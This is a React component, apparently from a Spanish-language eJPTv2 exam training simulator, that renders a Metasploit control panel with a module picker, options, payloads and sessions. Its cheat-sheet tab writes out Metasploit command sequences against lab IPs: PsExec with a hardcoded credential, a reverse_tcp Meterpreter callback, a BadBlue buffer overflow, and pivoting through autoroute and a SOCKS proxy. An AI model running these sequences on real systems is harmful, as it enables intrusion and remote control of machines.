import React, { useState } from 'react';
import { 
  Zap, 
  Terminal as TerminalIcon, 
  Server, 
  Play, 
  RotateCcw, 
  Check, 
  Copy, 
  ExternalLink, 
  ShieldAlert, 
  ChevronDown, 
  ChevronUp, 
  Maximize2, 
  X, 
  Sliders, 
  Layers, 
  Radio, 
  Key, 
  Info,
  Network
} from 'lucide-react';
import { CommandContext } from '../utils/commandEngine';
import { 
  METASPLOIT_MODULES, 
  POPULAR_PAYLOADS, 
  getMetasploitModule, 
  MetasploitModuleDef 
} from '../data/metasploitModules';

interface MetasploitPanelProps {
  context: CommandContext;
  onExecuteCommand: (cmd: string) => void;
  isModal?: boolean;
  isOpen?: boolean;
  onClose?: () => void;
  onToggleExpandModal?: () => void;
}

export const MetasploitPanel: React.FC<MetasploitPanelProps> = ({
  context,
  onExecuteCommand,
  isModal = false,
  isOpen = true,
  onClose,
  onToggleExpandModal
}) => {
  const currentModPath = context.msfModule || 'exploit/windows/smb/psexec';
  const currentModuleDef = getMetasploitModule(currentModPath) || METASPLOIT_MODULES[0];

  const [selectedModulePath, setSelectedModulePath] = useState<string>(currentModPath);
  const activeDef: MetasploitModuleDef = getMetasploitModule(selectedModulePath) || currentModuleDef;

  // Local state for options editing
  const [optionValues, setOptionValues] = useState<Record<string, string>>(() => {
    return {
      ...activeDef.defaultOptions,
      ...(context.msfOptions || {})
    };
  });

  const [copiedCmd, setCopiedCmd] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState<'options' | 'payloads' | 'cheatsheet' | 'sessions'>('options');
  const [isCollapsed, setIsCollapsed] = useState<boolean>(false);

  // Sync if context.msfModule changes
  React.useEffect(() => {
    if (context.msfModule) {
      setSelectedModulePath(context.msfModule);
      const mod = getMetasploitModule(context.msfModule);
      if (mod) {
        setOptionValues(prev => ({
          ...mod.defaultOptions,
          ...prev,
          ...(context.msfOptions || {})
        }));
      }
    }
  }, [context.msfModule, context.msfOptions]);

  // Handle module change from dropdown
  const handleSelectModule = (modPath: string) => {
    setSelectedModulePath(modPath);
    const mod = getMetasploitModule(modPath);
    if (mod) {
      const merged = {
        ...mod.defaultOptions,
        ...optionValues
      };
      setOptionValues(merged);
      if (context.shellMode === 'msf') {
        onExecuteCommand(`use ${mod.path}`);
      }
    }
  };

  const handleOptionChange = (key: string, value: string) => {
    setOptionValues(prev => ({ ...prev, [key]: value }));
  };

  const handleApplyOption = (key: string) => {
    const val = optionValues[key];
    if (context.shellMode === 'msf') {
      onExecuteCommand(`set ${key} ${val}`);
    } else {
      onExecuteCommand(`msfconsole`);
      setTimeout(() => {
        onExecuteCommand(`use ${activeDef.path}`);
        onExecuteCommand(`set ${key} ${val}`);
      }, 300);
    }
  };

  const handleApplyAllOptions = () => {
    if (context.shellMode !== 'msf') {
      onExecuteCommand('msfconsole');
      setTimeout(() => {
        onExecuteCommand(`use ${activeDef.path}`);
        Object.entries(optionValues).forEach(([k, v]) => {
          onExecuteCommand(`set ${k} ${v}`);
        });
      }, 400);
    } else {
      if (context.msfModule !== activeDef.path) {
        onExecuteCommand(`use ${activeDef.path}`);
      }
      Object.entries(optionValues).forEach(([k, v]) => {
        onExecuteCommand(`set ${k} ${v}`);
      });
    }
  };

  const handleLaunchExploit = () => {
    if (context.shellMode !== 'msf') {
      onExecuteCommand('msfconsole');
      setTimeout(() => {
        onExecuteCommand(`use ${activeDef.path}`);
        Object.entries(optionValues).forEach(([k, v]) => {
          onExecuteCommand(`set ${k} ${v}`);
        });
        setTimeout(() => {
          onExecuteCommand('exploit');
        }, 300);
      }, 500);
    } else {
      if (context.msfModule !== activeDef.path) {
        onExecuteCommand(`use ${activeDef.path}`);
      }
      onExecuteCommand('exploit');
    }
    if (isModal && onClose) {
      onClose();
    }
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCmd(id);
    setTimeout(() => setCopiedCmd(null), 2000);
  };

  // Discovered target hosts for 1-click RHOSTS picking
  const targetHostCandidates = [
    { ip: '10.10.10.25', name: 'TARGET-WIN-05', note: 'SMB PsExec (445)' },
    { ip: '10.10.10.30', name: 'TARGET-LEGACY-06', note: 'BadBlue HTTP (80)' },
    { ip: '10.10.10.20', name: 'TARGET-DB-04', note: 'MySQL / Linux' },
    { ip: '192.168.100.50', name: 'TARGET-WEB-01', note: 'DMZ Web' },
    { ip: '192.168.100.60', name: 'TARGET-GATEWAY-03', note: 'Pivot Gateway' }
  ];

  // Active Sessions Check
  const hasSession1 = context.compromisedHosts.has('10.10.10.25');
  const hasSession2 = context.compromisedHosts.has('10.10.10.30');
  const totalSessions = (hasSession1 ? 1 : 0) + (hasSession2 ? 1 : 0);

  if (!isOpen) return null;

  // Embedded vs Modal Container Styles
  const containerClasses = isModal
    ? 'fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-200'
    : 'border-b border-slate-800 bg-slate-900/90 backdrop-blur-md text-xs font-mono select-none transition-all duration-300';

  const contentClasses = isModal
    ? 'bg-slate-950 border border-slate-800 rounded-2xl w-full max-w-4xl max-h-[90vh] flex flex-col shadow-2xl overflow-hidden font-mono text-sm'
    : 'p-3 flex flex-col gap-3';

  return (
    <div className={containerClasses}>
      <div className={contentClasses}>
        {/* Header Bar */}
        <div className="flex items-center justify-between px-3 py-2 bg-slate-900/90 border-b border-slate-800 rounded-t-xl">
          <div className="flex items-center gap-2.5">
            <div className="p-1 rounded-md bg-sky-500/10 border border-sky-500/30 text-sky-400">
              <Zap className="w-4 h-4 animate-pulse" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="font-bold text-slate-100 flex items-center gap-1.5">
                  Metasploit Exploit Hub
                  <span className="text-[10px] px-1.5 py-0.2 rounded bg-sky-500/20 text-sky-300 border border-sky-500/40">
                    msf6
                  </span>
                </span>
                {context.shellMode === 'msf' && (
                  <span className="flex items-center gap-1 text-[11px] text-emerald-400 font-semibold px-2 py-0.5 rounded bg-emerald-500/10 border border-emerald-500/30">
                    <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                    msfconsole ACTIVA
                  </span>
                )}
                {context.shellMode === 'meterpreter' && (
                  <span className="flex items-center gap-1 text-[11px] text-teal-300 font-semibold px-2 py-0.5 rounded bg-teal-500/10 border border-teal-500/30">
                    ★ Meterpreter Shell Conectada
                  </span>
                )}
              </div>
              <p className="text-[11px] text-slate-400">
                Visualizador de módulos cargados, opciones configuradas (RHOSTS, LHOST, PAYLOAD) y flujo de explotación.
              </p>
            </div>
          </div>

          <div className="flex items-center gap-1.5">
            {/* Sessions Indicator */}
            {totalSessions > 0 && (
              <button
                onClick={() => {
                  if (context.shellMode === 'msf') {
                    onExecuteCommand('sessions -l');
                  } else {
                    onExecuteCommand('msfconsole');
                    setTimeout(() => onExecuteCommand('sessions -l'), 300);
                  }
                }}
                className="px-2 py-1 rounded bg-teal-500/20 text-teal-300 border border-teal-500/30 hover:bg-teal-500/30 transition-colors flex items-center gap-1 text-[11px]"
                title="Ver sesiones activas de Meterpreter"
              >
                <Radio className="w-3 h-3 text-teal-400 animate-pulse" />
                <span>{totalSessions} Sesión{totalSessions > 1 ? 'es' : ''}</span>
              </button>
            )}

            {!isModal && onToggleExpandModal && (
              <button
                onClick={onToggleExpandModal}
                className="p-1.5 rounded-lg text-slate-400 hover:text-slate-200 hover:bg-slate-800 transition-colors"
                title="Expandir a Modal Completo"
              >
                <Maximize2 className="w-3.5 h-3.5" />
              </button>
            )}

            {!isModal && (
              <button
                onClick={() => setIsCollapsed(!isCollapsed)}
                className="p-1.5 rounded-lg text-slate-400 hover:text-slate-200 hover:bg-slate-800 transition-colors"
                title={isCollapsed ? "Desplegar panel" : "Colapsar panel"}
              >
                {isCollapsed ? <ChevronDown className="w-4 h-4" /> : <ChevronUp className="w-4 h-4" />}
              </button>
            )}

            {isModal && onClose && (
              <button
                onClick={onClose}
                className="p-1.5 rounded-lg text-slate-400 hover:text-rose-400 hover:bg-slate-800 transition-colors"
                title="Cerrar modal"
              >
                <X className="w-4 h-4" />
              </button>
            )}
          </div>
        </div>

        {/* Collapsible Body */}
        {!isCollapsed && (
          <div className="flex-1 overflow-y-auto p-3 space-y-3">
            {/* 1. MODULE SELECTOR & DETAILS BANNER */}
            <div className="p-3 rounded-xl bg-slate-900 border border-slate-800/80 flex flex-col md:flex-row md:items-center justify-between gap-3">
              <div className="flex-1 space-y-1.5">
                <div className="flex items-center gap-2">
                  <span className="text-slate-400 text-xs font-semibold uppercase tracking-wider flex items-center gap-1">
                    <Layers className="w-3.5 h-3.5 text-sky-400" /> Módulo Cargado:
                  </span>
                  <select
                    value={activeDef.path}
                    onChange={(e) => handleSelectModule(e.target.value)}
                    className="flex-1 bg-slate-950 border border-sky-500/40 rounded-lg px-2.5 py-1 text-sky-300 font-mono text-xs focus:ring-1 focus:ring-sky-500 outline-none"
                  >
                    {METASPLOIT_MODULES.map(m => (
                      <option key={m.path} value={m.path}>
                        [{m.type.toUpperCase()}] {m.path} ({m.platform})
                      </option>
                    ))}
                  </select>
                </div>

                <div className="flex flex-wrap items-center gap-2 text-[11px]">
                  <span className="px-2 py-0.5 rounded bg-sky-500/10 border border-sky-500/30 text-sky-400 font-bold">
                    {activeDef.type.toUpperCase()}
                  </span>
                  <span className="px-2 py-0.5 rounded bg-emerald-500/10 border border-emerald-500/30 text-emerald-400">
                    Rank: {activeDef.rank}
                  </span>
                  <span className="px-2 py-0.5 rounded bg-slate-800 text-slate-300">
                    Fecha: {activeDef.disclosureDate}
                  </span>
                  {activeDef.cve && (
                    <span className="px-2 py-0.5 rounded bg-amber-500/10 border border-amber-500/30 text-amber-300 font-bold">
                      {activeDef.cve}
                    </span>
                  )}
                </div>

                <p className="text-slate-300 text-xs leading-relaxed">
                  {activeDef.description}
                </p>

                <div className="flex items-start gap-1.5 p-2 rounded-lg bg-sky-950/40 border border-sky-800/40 text-[11px] text-sky-200">
                  <Info className="w-3.5 h-3.5 text-sky-400 shrink-0 mt-0.5" />
                  <span>
                    <strong className="text-sky-300">Relevancia en eJPTv2:</strong> {activeDef.ejptExamNote}
                  </span>
                </div>
              </div>

              {/* Action Buttons */}
              <div className="flex flex-row md:flex-col gap-2 shrink-0 justify-end">
                <button
                  onClick={handleLaunchExploit}
                  className="px-3.5 py-2 rounded-xl bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white font-bold text-xs flex items-center justify-center gap-1.5 shadow-lg shadow-emerald-950/50 transition-all cursor-pointer active:scale-95"
                  title="Ejecuta `exploit` en la consola"
                >
                  <Play className="w-3.5 h-3.5 fill-current" />
                  <span>Lanzar Exploit (run)</span>
                </button>

                <button
                  onClick={handleApplyAllOptions}
                  className="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs flex items-center justify-center gap-1 border border-slate-700 transition-colors"
                  title="Aplica todos los comandos `set` a la consola"
                >
                  <Sliders className="w-3 h-3 text-sky-400" />
                  <span>Aplicar Parámetros (set)</span>
                </button>

                <button
                  onClick={() => {
                    if (context.shellMode === 'msf') {
                      onExecuteCommand('show options');
                    } else {
                      onExecuteCommand('msfconsole');
                      setTimeout(() => {
                        onExecuteCommand(`use ${activeDef.path}`);
                        onExecuteCommand('show options');
                      }, 300);
                    }
                  }}
                  className="px-3 py-1.5 rounded-xl bg-slate-800/60 hover:bg-slate-800 text-slate-300 hover:text-white text-xs flex items-center justify-center gap-1 border border-slate-700/60 transition-colors"
                >
                  <TerminalIcon className="w-3 h-3 text-slate-400" />
                  <span>show options</span>
                </button>
              </div>
            </div>

            {/* 2. NAVIGATION TABS */}
            <div className="flex items-center gap-2 border-b border-slate-800 pb-2 text-xs">
              <button
                onClick={() => setActiveTab('options')}
                className={`px-3 py-1 rounded-lg font-medium transition-colors flex items-center gap-1.5 ${
                  activeTab === 'options'
                    ? 'bg-sky-500/20 text-sky-300 border border-sky-500/30'
                    : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/60'
                }`}
              >
                <Sliders className="w-3.5 h-3.5" />
                <span>Opciones del Módulo ({activeDef.optionsList.length})</span>
              </button>

              <button
                onClick={() => setActiveTab('payloads')}
                className={`px-3 py-1 rounded-lg font-medium transition-colors flex items-center gap-1.5 ${
                  activeTab === 'payloads'
                    ? 'bg-sky-500/20 text-sky-300 border border-sky-500/30'
                    : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/60'
                }`}
              >
                <Radio className="w-3.5 h-3.5" />
                <span>Selector de Payload</span>
              </button>

              <button
                onClick={() => setActiveTab('cheatsheet')}
                className={`px-3 py-1 rounded-lg font-medium transition-colors flex items-center gap-1.5 ${
                  activeTab === 'cheatsheet'
                    ? 'bg-sky-500/20 text-sky-300 border border-sky-500/30'
                    : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/60'
                }`}
              >
                <Copy className="w-3.5 h-3.5" />
                <span>Comandos Rápidos eJPT</span>
              </button>

              <button
                onClick={() => setActiveTab('sessions')}
                className={`px-3 py-1 rounded-lg font-medium transition-colors flex items-center gap-1.5 ${
                  activeTab === 'sessions'
                    ? 'bg-sky-500/20 text-sky-300 border border-sky-500/30'
                    : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/60'
                }`}
              >
                <Network className="w-3.5 h-3.5" />
                <span>Sesiones y Pivoting ({totalSessions})</span>
              </button>
            </div>

            {/* 3. TAB CONTENT */}
            {activeTab === 'options' && (
              <div className="space-y-3">
                {/* Quick Target IP Selector */}
                <div className="flex flex-wrap items-center gap-1.5 p-2 rounded-lg bg-slate-900/60 border border-slate-800">
                  <span className="text-[11px] text-slate-400 font-semibold flex items-center gap-1">
                    <Server className="w-3 h-3 text-sky-400" /> Autocompletar RHOSTS:
                  </span>
                  {targetHostCandidates.map(host => (
                    <button
                      key={host.ip}
                      onClick={() => {
                        handleOptionChange('RHOSTS', host.ip);
                        if (context.shellMode === 'msf') {
                          onExecuteCommand(`set RHOSTS ${host.ip}`);
                        }
                      }}
                      className={`px-2 py-0.5 rounded text-[10px] font-mono transition-all flex items-center gap-1 border ${
                        optionValues['RHOSTS'] === host.ip
                          ? 'bg-sky-500/20 text-sky-300 border-sky-500/50 font-bold'
                          : 'bg-slate-800 hover:bg-slate-700 text-slate-300 border-slate-700/60'
                      }`}
                    >
                      <span>{host.ip}</span>
                      <span className="text-slate-500">({host.name})</span>
                    </button>
                  ))}
                </div>

                {/* Options Table */}
                <div className="border border-slate-800 rounded-xl overflow-hidden bg-slate-950">
                  <table className="w-full text-left text-xs">
                    <thead className="bg-slate-900/80 text-slate-400 border-b border-slate-800">
                      <tr>
                        <th className="py-2 px-3 font-semibold w-28">Parámetro</th>
                        <th className="py-2 px-3 font-semibold">Valor Configurado</th>
                        <th className="py-2 px-3 font-semibold w-20">Requerido</th>
                        <th className="py-2 px-3 font-semibold hidden sm:table-cell">Descripción</th>
                        <th className="py-2 px-3 font-semibold w-24 text-right">Acción</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/60 text-slate-300">
                      {activeDef.optionsList.map(opt => {
                        const currentVal = optionValues[opt.name] ?? opt.defaultValue;
                        const isModified = currentVal !== opt.defaultValue;

                        return (
                          <tr key={opt.name} className="hover:bg-slate-900/40 transition-colors">
                            <td className="py-2 px-3 font-bold text-sky-300">
                              {opt.name}
                            </td>
                            <td className="py-2 px-3">
                              <div className="flex items-center gap-2">
                                <input
                                  type="text"
                                  value={currentVal}
                                  onChange={(e) => handleOptionChange(opt.name, e.target.value)}
                                  className="w-full max-w-xs px-2 py-1 rounded bg-slate-900 border border-slate-700 text-slate-100 font-mono text-xs focus:ring-1 focus:ring-sky-500 focus:border-sky-500 outline-none"
                                />
                                {isModified && (
                                  <span className="text-[10px] text-amber-400 font-bold" title="Valor modificado">
                                    ●
                                  </span>
                                )}
                              </div>
                            </td>
                            <td className="py-2 px-3">
                              {opt.required ? (
                                <span className="text-rose-400 font-bold text-[10px] px-1.5 py-0.5 rounded bg-rose-500/10 border border-rose-500/20">
                                  yes
                                </span>
                              ) : (
                                <span className="text-slate-500 text-[10px] px-1.5 py-0.5 rounded bg-slate-800">
                                  no
                                </span>
                              )}
                            </td>
                            <td className="py-2 px-3 text-slate-400 text-[11px] hidden sm:table-cell">
                              {opt.description}
                            </td>
                            <td className="py-2 px-3 text-right">
                              <button
                                onClick={() => handleApplyOption(opt.name)}
                                className="px-2 py-1 rounded bg-slate-800 hover:bg-sky-600 hover:text-white text-slate-300 text-[11px] border border-slate-700/60 transition-colors"
                                title={`Ejecutar: set ${opt.name} ${currentVal}`}
                              >
                                Set
                              </button>
                            </td>
                          </tr>
                        );
                      })}
                    </tbody>
                  </table>
                </div>

                {/* One-Liner Preview */}
                <div className="p-2.5 rounded-lg bg-slate-900 border border-slate-800 flex items-center justify-between text-xs">
                  <div className="flex items-center gap-2 overflow-x-auto no-scrollbar font-mono text-slate-300">
                    <span className="text-slate-500 shrink-0">Comando Completo:</span>
                    <span className="text-emerald-400 shrink-0">
                      msfconsole -q -x &quot;use {activeDef.path};
                      {Object.entries(optionValues)
                        .map(([k, v]) => ` set ${k} ${v};`)
                        .join('')}
                      {' '}exploit&quot;
                    </span>
                  </div>
                  <button
                    onClick={() => {
                      const fullCmd = `msfconsole -q -x "use ${activeDef.path}; ${Object.entries(optionValues).map(([k, v]) => `set ${k} ${v};`).join(' ')} exploit"`;
                      copyToClipboard(fullCmd, 'oneliner');
                    }}
                    className="p-1 rounded text-slate-400 hover:text-emerald-300 transition-colors shrink-0 ml-2"
                    title="Copiar comando completo"
                  >
                    {copiedCmd === 'oneliner' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  </button>
                </div>
              </div>
            )}

            {/* TAB: PAYLOADS */}
            {activeTab === 'payloads' && (
              <div className="space-y-3">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-2.5">
                  {POPULAR_PAYLOADS.map(p => {
                    const isSelected = optionValues['PAYLOAD'] === p.name;
                    return (
                      <div
                        key={p.name}
                        onClick={() => {
                          handleOptionChange('PAYLOAD', p.name);
                          if (context.shellMode === 'msf') {
                            onExecuteCommand(`set PAYLOAD ${p.name}`);
                          }
                        }}
                        className={`p-3 rounded-xl border cursor-pointer transition-all ${
                          isSelected
                            ? 'bg-sky-500/10 border-sky-500/60 shadow-lg shadow-sky-950/40 ring-1 ring-sky-500/40'
                            : 'bg-slate-900/60 border-slate-800 hover:bg-slate-900 hover:border-slate-700'
                        }`}
                      >
                        <div className="flex items-center justify-between">
                          <span className="font-bold text-slate-200 text-xs">
                            {p.name}
                          </span>
                          <span className="text-[10px] px-1.5 py-0.5 rounded bg-slate-800 text-sky-400 font-mono">
                            {p.arch}
                          </span>
                        </div>
                        <p className="text-slate-400 text-[11px] mt-1 leading-relaxed">
                          {p.description}
                        </p>
                        {isSelected && (
                          <div className="mt-2 text-emerald-400 text-[11px] font-semibold flex items-center gap-1">
                            <Check className="w-3 h-3" /> Payload activo configurado
                          </div>
                        )}
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {/* TAB: CHEATSHEET */}
            {activeTab === 'cheatsheet' && (
              <div className="space-y-2">
                <p className="text-slate-400 text-xs mb-2">
                  Flujos de explotación y pivoting frecuentes exigidos en el examen eJPTv2:
                </p>

                {[
                  {
                    title: 'Pivoting Paso 1: Enrutar subred interna vía Meterpreter',
                    cmd: 'use post/multi/manage/autoroute\nset SUBNET 10.10.10.0\nset NETMASK 255.255.255.0\nset SESSION 1\nrun',
                    desc: 'Crea la ruta interna para que Metasploit alcance 10.10.10.0/24.'
                  },
                  {
                    title: 'Pivoting Paso 2: Iniciar servidor Proxy SOCKS5 en Kali',
                    cmd: 'use auxiliary/server/socks_proxy\nset SRVPORT 1080\nset VERSION 5\nrun',
                    desc: 'Abre el túnel TCP local para alimentar proxychains.'
                  },
                  {
                    title: 'Explotación PsExec con credenciales robadas',
                    cmd: 'use exploit/windows/smb/psexec\nset RHOSTS 10.10.10.25\nset SMBUser itadmin\nset SMBPass P@ssw0rd2024!\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.100.10\nexploit',
                    desc: 'Obtiene SYSTEM en TARGET-WIN-05 mediante SMB PsExec.'
                  },
                  {
                    title: 'Explotación Buffer Overflow BadBlue 2.7',
                    cmd: 'use exploit/windows/http/badblue_ext_overflow\nset RHOSTS 10.10.10.30\nset RPORT 80\nset LHOST 192.168.100.10\nset LPORT 4445\nexploit',
                    desc: 'Desborda ext.dll en TARGET-LEGACY-06 para shell Meterpreter.'
                  }
                ].map((item, idx) => (
                  <div key={idx} className="p-3 rounded-xl bg-slate-900 border border-slate-800 space-y-1.5">
                    <div className="flex items-center justify-between">
                      <span className="font-semibold text-sky-300 text-xs">{item.title}</span>
                      <button
                        onClick={() => {
                          copyToClipboard(item.cmd, `cheat-${idx}`);
                          if (context.shellMode === 'msf') {
                            const lines = item.cmd.split('\n');
                            lines.forEach((l, i) => {
                              setTimeout(() => onExecuteCommand(l), i * 150);
                            });
                          }
                        }}
                        className="px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-[11px] flex items-center gap-1 border border-slate-700 transition-colors"
                        title="Copiar o ejecutar secuencia"
                      >
                        {copiedCmd === `cheat-${idx}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                        <span>Ejecutar en MSF</span>
                      </button>
                    </div>
                    <pre className="p-2 rounded-lg bg-slate-950 border border-slate-800/80 text-emerald-400 text-[11px] overflow-x-auto whitespace-pre font-mono">
                      {item.cmd}
                    </pre>
                    <p className="text-slate-400 text-[11px]">{item.desc}</p>
                  </div>
                ))}
              </div>
            )}

            {/* TAB: SESSIONS */}
            {activeTab === 'sessions' && (
              <div className="space-y-3">
                <div className="p-3 rounded-xl bg-slate-900 border border-slate-800 space-y-2">
                  <span className="font-bold text-slate-200 text-xs flex items-center gap-1.5">
                    <Radio className="w-4 h-4 text-teal-400" /> Sesiones de Explotación Activas
                  </span>

                  {totalSessions === 0 ? (
                    <div className="p-4 rounded-lg bg-slate-950 text-center text-slate-500 text-xs">
                      No hay sesiones abiertas aún. Selecciona un exploit (ej. PsExec o BadBlue) y pulsa &quot;Lanzar Exploit&quot;.
                    </div>
                  ) : (
                    <div className="space-y-2">
                      {hasSession1 && (
                        <div className="p-2.5 rounded-lg bg-teal-500/10 border border-teal-500/30 flex items-center justify-between">
                          <div>
                            <div className="font-bold text-teal-300 text-xs flex items-center gap-2">
                              <span>Session 1: Meterpreter x64/windows</span>
                              <span className="text-[10px] px-1.5 py-0.2 rounded bg-teal-500/20 text-teal-400 font-mono">
                                NT AUTHORITY\SYSTEM
                              </span>
                            </div>
                            <p className="text-slate-400 text-[11px]">
                              Host: 10.10.10.25:445 (TARGET-WIN-05) | Handler: 192.168.100.10:4444
                            </p>
                          </div>
                          <button
                            onClick={() => {
                              if (context.shellMode === 'msf') {
                                onExecuteCommand('sessions -i 1');
                              } else {
                                onExecuteCommand('msfconsole');
                                setTimeout(() => onExecuteCommand('sessions -i 1'), 300);
                              }
                            }}
                            className="px-2.5 py-1 rounded-lg bg-teal-600 hover:bg-teal-500 text-white font-bold text-xs transition-colors"
                          >
                            Interactuar (-i 1)
                          </button>
                        </div>
                      )}

                      {hasSession2 && (
                        <div className="p-2.5 rounded-lg bg-teal-500/10 border border-teal-500/30 flex items-center justify-between">
                          <div>
                            <div className="font-bold text-teal-300 text-xs flex items-center gap-2">
                              <span>Session 2: Meterpreter x86/windows</span>
                              <span className="text-[10px] px-1.5 py-0.2 rounded bg-teal-500/20 text-teal-400 font-mono">
                                NT AUTHORITY\SYSTEM
                              </span>
                            </div>
                            <p className="text-slate-400 text-[11px]">
                              Host: 10.10.10.30:80 (TARGET-LEGACY-06) | Handler: 192.168.100.10:4445
                            </p>
                          </div>
                          <button
                            onClick={() => {
                              if (context.shellMode === 'msf') {
                                onExecuteCommand('sessions -i 2');
                              } else {
                                onExecuteCommand('msfconsole');
                                setTimeout(() => onExecuteCommand('sessions -i 2'), 300);
                              }
                            }}
                            className="px-2.5 py-1 rounded-lg bg-teal-600 hover:bg-teal-500 text-white font-bold text-xs transition-colors"
                          >
                            Interactuar (-i 2)
                          </button>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default MetasploitPanel;
